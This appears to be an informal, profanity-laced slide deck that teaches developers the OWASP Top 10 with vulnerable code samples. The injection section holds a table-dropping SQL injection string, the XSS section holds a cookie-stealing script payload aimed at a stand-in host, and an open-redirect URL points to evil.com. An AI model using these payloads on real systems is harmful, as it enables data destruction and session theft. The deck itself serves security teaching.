# Smug Cast: Security

# The Threat Landscape

The tools are so easy to use, a LITERAL CHILD can do it.

https://www.youtube.com/watch?v=Fp47G4MQFvA&t=176

Step your game up.

# Security 101

ALWAYS assume the user or client is

* an asshole
* an idiot
* a hacker

# Hash vs Encrypt

There is a difference.

- **Hash** One way, non-reversable, asymmetric
- **Encrypt** Two-way, reversabe, symmetric

# Strings Are Evil

I hear you saying:

> What could a harmless little string do?

# Fuck Strings

![No damn cat, no damn cradle.](./images/cats_cradle.jpg)

# General Tips

* Trust NO ONE
* The query string is awful
* Regex All The Things
* SSL is FREE
* Stop Leaking Information
* LOG error messages, never present them to the user ever.

# The 10

OWASP - Top 10

# 1 - Injection

```javascript
// ever see code like this?

var con = new SqlConnection(connectionString);
con.Open();

var cmd = con.CreateCommand();
cmd.CommandText = "select * from users"
  + " where user_name = '" + userName + "'"
  + " and password = '" + password + "'";

var reader = cmd.ExecuteReader();
// ... blah blah blah
```

# Little Bobby Drop Tables

Now imagine a password input that accepts: "'; drop table users;--"

No matter how it sneaks in
- Un-sanitized front-end inputs
- Raw POST data
- Trusting cookies
- etc...

```sql
  select * from users where user_name = 'anything' and password = ''; drop table users;--'
```

# Maybe...

Maybe if I just escape that pesky single quote character, or the -- to prevent commas.

# WRONG

https://www.youtube.com/watch?v=WrjwaqZfjIY

# 2 - Broken Auth / Session

# 2.1 Session Management

THE SESSION IS YOU

- session fixation
- session hijacking

# 2.2 Broken Authentication

NEVER

- store plan-text passwords
- roll your own crypto
- expose session information over an insecure channel
-

ALWAYS

- use secure + http-only cookies
- use SSL (it's 2017 certs, are LITERALLY FREE)
- expire sessions

# 3 - XSS

If ever there was a security topic more vague, it is this.

Broadly, tricking you into storing a payload crafted by an attacker and presenting it to others.

# 3.1 - XSS Example

```java
// OH HEY LOOK, STRINGS! Seems fine...
Page.Write("<div>" + post.Body + "</div>";
```

```java
// UH OH...
Console.WriteLine(post.Body)
// "<script>document.location='//steal.it/?secret='+document.cookie</script>"
```

# 3.2 XSS The Video Game!

[xss-game.appspot.com)](https://xss-game.appspot.com/level1)

# 4 - Insecure References

Security by... altruism?

- GET /account/1
- GET /account/999

**Fixed by** authorizing _all_ requests, and ensuring that the user has access to the specific resource, not just the endpoint.

# 5 - Security Misconfiguration

## Essentially, RTFM.

- Never use known default credentials
- Disable directory listing
- Ensure custom (non-descript) error messages are sent to clients
- Block unnecessary ports

# 6 - Sensitive Data Exposure

Do you have sensitive data? Don't expose it.

# 7 - Missing ACLs

"Function Level Access Control"

```java
[Authorize]
public ActionResult Admin()
{
  // Boy, I sure hope nobody calls this when they aren't supposed to 4Head
  return View()
}
```

# 7.1

Essentually: Ensure that just _knowing the URL_ doesn't entitle the user to special rights.

# 8 - Cross-Site Request Forgery (CSRF)

## example:
```html

<form method="POST" action="/transfer">
  <input name="amount" type="text" />
  <input name="from-account" type="text" />
  <input name="to-account" type="text" />
</form>

```

# 8.1 - Server

## Do you even HTTP?

When a request is made to a domain, ALL cookies for that domain are sent along with the request. 

If one of those cookies is for a SESSION is still valid... yeah. You have been pwned.

# 9 - Using Components with Known Vulnerabilities

- This is not just an Ops problem.
- Fight to keep software up to date.

# 10 - Unvalidated Redirects and Forwards

```
http://www.example.com/redirect.jsp?url=evil.com
```